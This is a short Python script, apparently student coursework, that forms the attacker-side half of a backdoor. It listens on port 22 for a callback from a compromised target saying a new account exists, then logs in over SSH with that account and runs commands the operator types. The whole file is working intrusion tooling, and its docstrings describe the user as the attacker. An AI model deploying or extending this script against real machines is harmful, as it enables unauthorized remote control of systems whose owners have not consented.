# Ronnie Blondale rb7153@rit.edu
import socket
import paramiko
import sys

def listener():
    """
    This function sits and waits for the connection from the target machine to know when the account is created
    """
    host = socket.gethostname()
    pp = 22
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # creating the socket
    soc.bind((host, pp))
    soc.listen(1)
    conn, addr = soc.accept()
    print(addr)
    m = conn.recv(1024)
    m = m.decode()
    print(m)

def ssh_session():
    """
    This function takes the command line arguments and creates an SSH session with the new user that was
    created on the target machine. It will then parse commands until the attacker is finished with the SSH session. Very
    limit functionality with working commands through the SSH connection.
    """
    serv = str(sys.argv[1])
    username = str(sys.argv[2])
    passwd = str(sys.argv[3])
    s = paramiko.SSHClient()
    s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        s.connect(hostname=serv, username=username, password=passwd)
    except:
        print("Could not connect to the SSH session")
        s.close()
        return 0

    while True:
        w = str(input(">>"))
        stdin, stdout, stderr = s.exec_command(w)
        x = stdout.readlines()
        y = stderr.readlines()
        print(x + y)
        if w == "exit":
            s.close()
            return 0


def main():
    if len(sys.argv) != 4:
        print("invalid number of arguments... <IP> <username> <password>")
    else:
        listener()
        ssh_session()

main()
